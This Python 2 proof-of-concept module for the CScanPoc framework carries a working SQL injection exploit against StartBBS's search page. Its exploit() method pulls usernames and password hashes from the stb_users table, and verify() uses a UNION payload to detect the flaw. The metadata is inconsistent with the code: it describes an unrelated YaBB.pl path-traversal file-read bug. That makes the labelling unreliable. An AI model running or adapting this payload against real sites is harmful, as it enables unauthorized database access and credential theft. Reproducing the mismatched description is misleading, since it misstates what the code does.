# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib
import urllib2
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'StartBBS_0006'  # 平台漏洞编号，留空
    name = 'YaBB.pl ?board=news&action=display&num= 任意文件读取漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2008-10-25'  # 漏洞公布时间
    desc = '''
        YaBB.pl是一个基于Web的公告牌脚本程序。YaBB.pl它将公告牌中的文章存放在编号的文本文件中。
        编号的文件名是在调用YaBB.pl时通过变量num=<file>来指定的。在检索该文件之前，YaBB在<file>后面添加一个后缀.txt。
        由于YaBB中的输入合法性检查错误，在<file>中可以指定相对路径。这包括../类型的路径。
        此外，<file>可以不是数字格式，而且.txt后缀可以通过在<file>后面添加%00来避免。
        通过在单个请求中使用上述的这些漏洞，恶意用户可以察看Web服务器可以存取的任何文件。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-4308'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'StartBBS'  # 漏洞应用名称
    product_version = '1.1.5.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a442fe17-f925-4722-a2d7-19d67d0e7fb1'
    author = '国光'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/index.php/home/search?q=1%27union%20select%201,2,3,4,"
                       "md5(666),6,7,8,9,0,1,2,3,4,5,6,7--%20&sitesearch=http%3A%2F%2F127.0.0.1%2Fstartbbs%2F")
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()

            if 'fae0b27c451c728867a567e8c1bb4e53' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/index.php/home/search?q=1%27union%20select%201,2,3,4,"
                       "concat(%27~%27,username,md5(3.1416),password,%27~%27),6,7,8,9,0,1"
                       ",2,3,4,5,6,7%20from%20stb_users--%20&sitesearch=http%3A%2F%2F127.0.0.1%2Fstartbbs%2F")
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()

            match = re.search(
                '~(.*?)d4d7a6b8b3ed8ed86db2ef2cd728d8ec(.*?)~', content)
            if match:
                username = match.group(1)
                password = match.group(2)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(
                    target=self.target, name=self.vuln.name, username=username, password=password))
        except Exception, e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
